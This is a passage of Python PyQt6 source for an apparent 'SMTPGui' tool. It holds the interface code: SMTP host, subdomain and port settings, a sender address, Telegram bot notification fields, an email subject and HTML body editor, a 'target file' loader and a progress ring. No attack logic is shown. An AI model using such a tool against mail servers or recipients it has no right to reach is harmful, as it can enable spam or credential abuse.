QTabBar::tab {
    background: #3949AB;
    color: #FFFFFF;
    padding: 12px 20px;
    font-weight: bold;
    font-size: 18px;
    border: 2px solid #3949AB;
    border-bottom: none;
}

QTabBar::tab:first {
    border-top-left-radius: 15px;
    border-bottom-left-radius: 15px;
}

QTabBar::tab:last {
    border-top-right-radius: 15px;
    border-bottom-right-radius: 15px;
}

QTabBar::tab:selected {
    background: #29B6F6;
    color: #FFFFFF;
}

QTabBar::tab:!selected {
    margin-top: 2px;
}

/* Vertical Scrollbar Styling */
QScrollBar:vertical {
    background: rgb(20, 20, 30);
    width: 16px;
    border-radius: 7px;
}

QScrollBar::handle:vertical {
    background-color: rgb(67, 84, 182);
    min-height: 40px;
    border-radius: 7px;
}

QScrollBar::handle:vertical:hover {
    background-color: rgb(100, 150, 255);
}

QScrollBar::handle:vertical:pressed {
    background-color: rgb(185, 0, 92);
}

/* Hide Scrollbar Buttons */
QScrollBar::sub-line:vertical,
QScrollBar::add-line:vertical,
QScrollBar::up-arrow:vertical,
QScrollBar::down-arrow:vertical,
QScrollBar::add-page:vertical,
QScrollBar::sub-page:vertical {
    background: none;
}


""")

        main_layout.addWidget(self.log_console, alignment=Qt.AlignmentFlag.AlignTop)

    def create_card(self, title, image_path, update_text="", width=380, height=250):

        # Create the card widget and set its size and style
        card = QWidget()
        card.setFixedSize(width, height)
        card.setStyleSheet("background-color: #1C1C2E; padding: 20px; border-radius: 15px;")
        
        # Main vertical layout for the card
        main_layout = QVBoxLayout()
        main_layout.setSpacing(5)

        # Top layout (horizontal) with title on the left and image on the right
        top_layout = QHBoxLayout()
        top_layout.setSpacing(10)

        # Title label (left side)
        title_label = QLabel(title)
        title_label.setFont(QFont("Arial", 18))
        title_label.setStyleSheet("color: #29B6F6;")
        top_layout.addWidget(title_label, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        
        # Image label (right side)
        image_label = QLabel()
        pixmap = QPixmap(image_path).scaled(100, 80, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation)
        image_label.setPixmap(pixmap)
        top_layout.addWidget(image_label, alignment=Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignTop)

        # Centered update info label (dynamic update)
        update_info = QLabel(update_text)
        update_info.setFont(QFont("Arial", 28))
        update_info.setStyleSheet("color: #29B6F6; margin-top: -40px;")
        update_info.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignCenter)

        # Add top layout to the main layout
        main_layout.addLayout(top_layout)
        main_layout.addWidget(update_info, alignment=Qt.AlignmentFlag.AlignCenter)

        # Set the main layout to the card
        card.setLayout(main_layout)

        # Return both card widget and label reference
        return card, update_info  

    def create_button(self, text, width=150, height=50, color1="#3949AB", color2="#29B6F6", color_hover1="#5C6BC0", color_hover2="#3F51B5"):
        button = QPushButton(text)
        button.setFixedSize(width, height)
        button.setStyleSheet(f"""
            QPushButton {{
                background: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 {color1}, stop:1 {color2});
                color: white;
                font-weight: bold;
                font-size: 18px;
                border-radius: 15px;
                padding: 15px;
            }}
            QPushButton:hover {{
                background: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:1, stop:0 {color_hover1}, stop:1 {color_hover2});
            }}
        """)
        return button

    def create_input_box(self, placeholder, width=330, height=55):
        input_box = QLabel(placeholder)
        input_box.setFixedSize(width, height)
        input_box.setStyleSheet("background-color: #1C1C2E; padding: 15px; border-radius: 10px; font-size: 18px; color: #E0E0E0;")
        return input_box

    def create_text_display(self, width=880, height=200):
        text_display = QTextEdit()
        text_display.setReadOnly(True)
        text_display.setFixedSize(width, height)
        text_display.setStyleSheet("background-color: #1C1C2E; color: #E0E0E0; padding: 15px; border-radius: 12px; font-size: 14px;")
        return text_display
    
    # Function to apply shadow effect to a widget
    def apply_shadow_effect(self, widget, blur_radius=15, x_offset=0, y_offset=5, color=QColor(0, 0, 0, 100)):
        """
        Apply a shadow effect to the given widget.
        :param widget: QWidget to apply shadow effect.
        :param blur_radius: Blur radius for shadow.
        :param x_offset: Horizontal offset for shadow.
        :param y_offset: Vertical offset for shadow.
        :param color: QColor for shadow.
        """
        shadow_effect = QGraphicsDropShadowEffect()
        shadow_effect.setBlurRadius(blur_radius)
        shadow_effect.setOffset(x_offset, y_offset)
        shadow_effect.setColor(color)
        widget.setGraphicsEffect(shadow_effect)

    def create_progress_card(self, width=200, height=100):
        card = QWidget()
        card.setFixedSize(width, height)
        card.setStyleSheet("background-color: #1C1C2E; padding: 10px; border-radius: 15px;")
        card_layout = QVBoxLayout()
        card_layout.setSpacing(5)

        title_label = QLabel("Progress")
        title_label.setFont(QFont("Arial", 16))
        title_label.setStyleSheet("color: #29B6F6;")
        card_layout.addWidget(title_label, alignment=Qt.AlignmentFlag.AlignLeft)

        self.canvas = CanvasWidget()
        self.canvas.setFixedSize(180, 180)
        card_layout.addWidget(self.canvas, alignment=Qt.AlignmentFlag.AlignCenter)

        card.setLayout(card_layout)
        return card
    

        
   
    def Saved_Config(self):

        # error : for key, value in keys.items(): 
        config = ConfigParser()
        config['Config'] = {}
        smtp_subdomains = [
                            "smtp", "smtpout",# "webmail", "mail", "imap", "email", "pop", "pop3", "mailserver",
                            #"smtp1", "smtp2", "mx", "mx1", "mx2", "mx3", "mail1", "mail2", "relay",
                            #"mailgate", "smtp-gateway", "emailserver", "smtp-mail", "exchange",
                            #"securemail", "outbound", "inbound", "smtp-relay", "smtp-secure", "authsmtp"
                            ]
        config['Config']['SMTP_SUBDOMAIN'] = ', '.join(smtp_subdomains)
        config['Config']['SMTP_HOSTS'] = self.smtphost_input.toPlainText()
        config['Config']['PORTS'] = self.ports_input.text()
        config['Config']['EMAIL_SENDER'] = self.email_input.text()
        config['Config']['TIMEOUT'] = self.timeout_input.text()
        config['Config']['NOTIFICATION'] = self.status_notification['status'] 
        config['Config']['TELEGRAM_CHATID'] = self.chat_id_input.text()
        config['Config']['TELEGRAM_TOKEN'] = self.api_token_input.text()
        config['Config']['HEADER'] = self.header_input.text()
        config['Config']['HTML_Content'] = self.html_input.toPlainText()
        #     'smtp_hosts' = self.smtphost_input.toPlainText(),
        #     'ports' = self.ports_input.text(),
        #     'email_sender' = self.email_input.text()
        # }
        # config['SMTP_Ports'] = {
        #     'ports': self.ports_input.text()
        # }
        # config['Email'] = {
        #     'email_sender': self.email_input.text()
        # }
        # config['Timeout'] = {
        #     'timeout': self.timeout_input.text()
        # }
        # config['tg_chatid'] = {
        #     'telegram_chatid': self.chat_id_input.text()
        # }

        # config['tg_token'] = {
        #     'telegram_token': self.api_token_input.text()
        # }
        # config['Header_Text'] = {
        #     'header': self.header_input.text()  
        # }
        # config['HTML_Content'] = {
        #     'content': self.html_input.toPlainText()
        # }


        
        with open('Config.ini', 'w', encoding='utf-8', errors='ignore') as config_raw:
            config.write(config_raw)

    def setup_second_tab(self):
        #print("Setting up second tab...")
        

        # Main 
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(0)
        self.second_tab.setLayout(layout)

        # Combined Frame All Settings
        combined_frame = QFrame()
        combined_frame.setStyleSheet("background-color: #1C1C2E; padding: 10px; border-radius: 15px;")
        self.apply_shadow_effect(combined_frame, blur_radius=15, x_offset=0, y_offset=5, color=QColor(0, 0, 0, 100))
        combined_frame.setFixedHeight(700)

        # Layout combined frame
        combined_layout = QVBoxLayout()
        combined_layout.setContentsMargins(0, 0, 0, 0)
        combined_layout.setSpacing(20)

        # SMTP Host and SMTP Ports combined in one row
        smtp_layout = QHBoxLayout()
        smtp_layout.setSpacing(10)

        # SMTPHost Label
        smtp_host_label = QLabel("SMTP Host:")
        smtp_host_label.setStyleSheet("font-size: 16px; color: #29B6F6; font-weight: bold;")
        smtp_host_label.setFont(QFont("Arial", 16))

        # SMTPHost Input
        self.smtphost_input = QTextEdit()
        self.smtphost_input.setPlaceholderText("smtp.host.default (default)\nsmtp.office365.com")
        self.smtphost_input.setStyleSheet(
            "QTextEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #1A1A1A; border-radius: 10px; padding: 10px; }"
            "QTextEdit:focus { border: 2px solid #29B6F6; }"
        )
        self.smtphost_input.setFixedHeight(150)
        self.smtphost_input.setFont(QFont("Arial", 14))

        # SMTPPorts Label
        ports_label = QLabel("SMTP Ports:")
        ports_label.setStyleSheet("font-size: 16px; color: #29B6F6; font-weight: bold;")
        ports_label.setFont(QFont("Arial", 16))
        

        subdomain_host = QLabel("Subdomain Host:")
        subdomain_host.setStyleSheet("font-size: 16px; color: #29B6F6; font-weight: bold;")
        subdomain_host.setFont(QFont("Arial", 16))

        # SMTPPorts Input 
        self.ports_input = QLineEdit()
        self.ports_input.setText("587,465,25")
        self.ports_input.setStyleSheet(
            "QLineEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #121212; "
            "border-radius: 10px; padding: 10px; }"
            "QLineEdit::placeholder { color: #9FA8DA; font-style: italic; }"
            "QLineEdit:focus { border: 2px solid #29B6F6; }"
        )
        self.ports_input.setFixedHeight(40)
        self.ports_input.setFixedWidth(160)
        self.ports_input.setFont(QFont("Arial", 14))

        self.load_file_button = self.create_button("Save Config", width=160, height=50, color1="#3949AB", color2="#29B6F6", color_hover1="#5C6BC0", color_hover2="#3F51B5")
        self.load_file_button.clicked.connect(self.Saved_Config)
        


        # Adding SMTPHost and Ports 
        smtp_layout.addWidget(smtp_host_label)
        smtp_layout.addWidget(self.smtphost_input)
        smtp_layout.addWidget(ports_label)
        smtp_layout.addWidget(self.ports_input)
        smtp_layout.addWidget(self.load_file_button)
        # Bind Together
        combined_layout.addLayout(smtp_layout)

        # Email Configuration 
        email_layout = QHBoxLayout()
        email_layout.setSpacing(10)

        email_label = QLabel("Email Configuration:")
        email_label.setStyleSheet("font-size: 16px; color: #29B6F6; font-weight: bold;")
        email_label.setFont(QFont("Arial", 16))

        self.email_input = QLineEdit()
        self.email_input.setPlaceholderText("Enter email address")
        #self.email_input.setText("")
        self.email_input.setStyleSheet(
            "QLineEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #121212; "
            "border-radius: 10px; padding: 10px; }"
            "QLineEdit::placeholder { color: #9FA8DA; font-style: italic; }"
            "QLineEdit:focus { border: 2px solid #29B6F6; }"
        )
        self.email_input.setFixedHeight(40)
        self.email_input.setFont(QFont("Arial", 14))
        

        self.timeout_input = QLineEdit()
        self.timeout_input.setPlaceholderText("Enter timeout (seconds)")
        self.timeout_input.setText("15")
        self.timeout_input.setStyleSheet(
            "QLineEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #121212; "
            "border-radius: 10px; padding: 10px; }"
            "QLineEdit::placeholder { color: #9FA8DA; font-style: italic; }"
            "QLineEdit:focus { border: 2px solid #29B6F6; }"
        )
        self.timeout_input.setFixedHeight(40)
        self.timeout_input.setFont(QFont("Arial", 14))

        email_layout.addWidget(email_label)
        email_layout.addWidget(self.email_input)
        email_layout.addWidget(self.timeout_input)

        combined_layout.addLayout(email_layout)

        # Telegram API Settings 
        telegram_layout = QHBoxLayout()
        telegram_layout.setSpacing(10)

        telegram_label = QLabel("Telegram API:")
        telegram_label.setStyleSheet("font-size: 16px; color: #29B6F6; font-weight: bold;")
        telegram_label.setFont(QFont("Arial", 16))

        self.telegram_checkbox = QCheckBox("Enable Notifications")
        self.telegram_checkbox.setStyleSheet("font-size: 14px; color: #E0E0E0; font-weight: bold;")
        self.telegram_checkbox.setFont(QFont("Arial", 14))
        self.telegram_checkbox.stateChanged.connect(self.toggle_telegram_fields)

        self.chat_id_input = QLineEdit()
        self.chat_id_input.setPlaceholderText("Enter Chat ID")
        self.chat_id_input.setFixedWidth(180)
        self.chat_id_input.setFixedHeight(40)
        self.chat_id_input.setFont(QFont("Arial", 14))
        self.chat_id_input.setStyleSheet(
            "QLineEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #121212; "
            "border-radius: 10px; padding: 10px; }"
            "QLineEdit::placeholder { color: #9FA8DA; font-style: italic; }"
            "QLineEdit:focus { border: 2px solid #29B6F6; }"
        )

        self.api_token_input = QLineEdit()
        self.api_token_input.setPlaceholderText("Enter Token")
        self.api_token_input.setFixedHeight(40)
        self.api_token_input.setFont(QFont("Arial", 14))
        self.api_token_input.setStyleSheet(
            "QLineEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #121212; "
            "border-radius: 10px; padding: 10px; }"
            "QLineEdit::placeholder { color: #9FA8DA; font-style: italic; }"
            "QLineEdit:focus { border: 2px solid #29B6F6; }"
        )

        telegram_layout.addWidget(telegram_label)
        telegram_layout.addWidget(self.telegram_checkbox)
        telegram_layout.addWidget(self.chat_id_input)
        telegram_layout.addWidget(self.api_token_input)

        combined_layout.addLayout(telegram_layout)

        # Header and HTML Content Input
        header_layout = QHBoxLayout()
        header_label = QLabel("Header Subject:")
        header_label.setStyleSheet("font-size: 16px; color: #29B6F6; font-weight: bold;")
        header_label.setFont(QFont("Arial", 16))

        self.header_input = QLineEdit()
        self.header_input.setPlaceholderText("Enter email subject here...")
        self.header_input.setFixedHeight(40)
        self.header_input.setFont(QFont("Arial", 14))
        self.header_input.setStyleSheet(
            "QLineEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #121212; "
            "border-radius: 10px; padding: 10px; }"
            "QLineEdit:focus { border: 2px solid #29B6F6; }"
        )

        header_layout.addWidget(header_label)
        header_layout.addWidget(self.header_input)
        combined_layout.addLayout(header_layout)

        # HTML Content Input with Preview Button
        overlay_widget = QWidget()
        overlay_layout = QGridLayout()
        overlay_layout.setContentsMargins(0, 0, 0, 0)
        overlay_layout.setSpacing(0)

        # Create a QTextEdit 
        self.html_input = QTextEdit(self)
        self.html_input.setPlaceholderText("Enter HTML content here...")
        self.html_input.setFixedHeight(330)
        self.html_input.setFont(QFont("Arial", 14))
        self.html_input.setStyleSheet(
            "QTextEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; background-color: #1A1A1A; "
            "border-radius: 10px; padding: 10px; }"
            "QTextEdit:focus { border: 2px solid #29B6F6; }"
        )

        # Set QTextEdit to handle plain text
        self.html_input.setAcceptRichText(False)
        
        self.preview_button = QPushButton("Preview")
        self.preview_button.setStyleSheet(
            "QPushButton { background-color: #181818; color: #FFFFFF; font-weight: bold; font-size: 14px; border-radius: 10px; padding: 5px 10px; }"
            "QPushButton:hover { background-color: #3949AB; }"
        )
        
        self.preview_button.clicked.connect(self.show_preview_dialog)
        self.apply_shadow_effect(self.preview_button)

        overlay_layout.addWidget(self.html_input, 0, 0)
        overlay_layout.addWidget(self.preview_button, 0, 0, alignment=Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignRight)
        overlay_widget.setLayout(overlay_layout)

        combined_layout.addWidget(overlay_widget)

        # Setting the layer combined_frame
        combined_frame.setLayout(combined_layout)
        layout.addWidget(combined_frame, alignment=Qt.AlignmentFlag.AlignTop)


    def show_preview_dialog(self):
        header_text = self.header_input.text()
        html_content = self.html_input.toPlainText()
        dialog = PreviewDialog(header_text, html_content)
        dialog.exec()  # Opens the dialog as a modal window

    def style_line_edit(self, line_edit):
        line_edit.setStyleSheet(
            "QLineEdit { color: #E0E0E0; font-size: 15px; border: 2px solid #3949AB; "
            "background-color: #121212; border-radius: 10px; padding: 10px; }"
            "QLineEdit::placeholder { color: #9FA8DA; font-style: italic; }"
            "QLineEdit:focus { border: 2px solid #29B6F6; }"
        )
        line_edit.setFixedHeight(40)
        line_edit.setFont(QFont("Arial", 14))

    def toggle_telegram_fields(self):
        self.status_notification = {
                'status': 'enabled' if self.telegram_checkbox.isChecked() else 'disabled' }
        #print(f"Enabled/Disabled Telegram ", self.status_notification) 
        self.chat_id_input.setEnabled(self.telegram_checkbox.isChecked())
        self.api_token_input.setEnabled(self.telegram_checkbox.isChecked())


        #Animate tab transition when the user switches tabs
    def animate_tab_change(self, index):
        #Animate tab transition when the user switches tabs
        next_widget = self.central_widget.widget(index)
        original_geometry = self.central_widget.geometry()

        # Slide animation : tab transition
        slide_in = QPropertyAnimation(next_widget, b"geometry")
        slide_in.setDuration(500)
        slide_in.setStartValue(QRect(original_geometry.x() + self.width(), original_geometry.y(), original_geometry.width(), original_geometry.height()))
        slide_in.setEndValue(original_geometry)
        slide_in.setEasingCurve(QEasingCurve.Type.OutQuad)

        # Fade animation : tab transition
        fade_in = QPropertyAnimation(next_widget, b"windowOpacity")
        fade_in.setDuration(400)
        fade_in.setStartValue(0.0)
        fade_in.setEndValue(1.0)
        fade_in.setEasingCurve(QEasingCurve.Type.OutQuad)

        next_widget.setVisible(True)
        next_widget.setWindowOpacity(0.0)

        self.animation_group = QSequentialAnimationGroup()
        self.animation_group.addAnimation(slide_in)
        self.animation_group.addAnimation(fade_in)
        self.animation_group.start()

    def TARGET_FILE(self):
        file_dialog = QFileDialog()
        self.file_path, _ = file_dialog.getOpenFileName(self, "Open Target File", "", "Text Files (*.txt)")
        if self.file_path:
            #filename = os.path.basename(file_path)
            self.file_path_display.setText(self.file_path)
            self.log_console.append(f"Loaded target file: {self.file_path}")


    def initial_slide_animation(self):
        current_widget = self.central_widget.widget(0)
        original_geometry = self.central_widget.geometry()

        slide_in = QPropertyAnimation(current_widget, b"geometry")
        slide_in.setDuration(800)
        slide_in.setStartValue(QRect(original_geometry.x() + self.width(), original_geometry.y(), original_geometry.width(), original_geometry.height()))
        slide_in.setEndValue(original_geometry)
        slide_in.setEasingCurve(QEasingCurve.Type.OutQuad)

        fade_in = QPropertyAnimation(current_widget, b"windowOpacity")
        fade_in.setDuration(600)
        fade_in.setStartValue(0.0)
        fade_in.setEndValue(1.0)
        fade_in.setEasingCurve(QEasingCurve.Type.InOutQuad)

        self.initial_animation_group = QSequentialAnimationGroup()
        self.initial_animation_group.addAnimation(slide_in)
        self.initial_animation_group.addAnimation(fade_in)
        self.initial_animation_group.start()

class CanvasWidget(QWidget):
    def __init__(self):
        super().__init__()
        self.progress = 0
        

    def set_progress(self, progress):
        #print(f"Setting progress: {progress}%")
        self.progress = progress
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        rect = self.rect()

        painter.setPen(Qt.PenStyle.NoPen)
        painter.drawRect(rect)

        arc_rect = rect.adjusted(10, 10, -10, -10)

        empty_pen = QPen()
        empty_pen.setWidth(14)
        empty_pen.setColor(QColor(50, 50, 70))
        painter.setPen(empty_pen)
        painter.drawArc(arc_rect, 0, 360 * 16)

        center_point = QPointF(rect.center().x(), rect.center().y())
        gradient = QConicalGradient(center_point, -90)
        gradient.setColorAt(0.0, QColor(41, 182, 246))
        gradient.setColorAt(1.0, QColor(90, 150, 250))

        gradient_pen = QPen()
        gradient_pen.setWidth(16)
        gradient_pen.setBrush(gradient)
        gradient_pen.setCapStyle(Qt.PenCapStyle.RoundCap)
        painter.setPen(gradient_pen)

        start_angle = 90 * 16
        span_angle = -int(360 * self.progress / 100) * 16
        painter.drawArc(arc_rect, start_angle, span_angle)

        painter.setPen(QColor(224, 224, 224))
        painter.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        painter.drawText(rect, Qt.AlignmentFlag.AlignCenter, f"{self.progress}%")
        painter.end()
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = SMTPGui()
    window.show()
    sys.exit(app.exec())
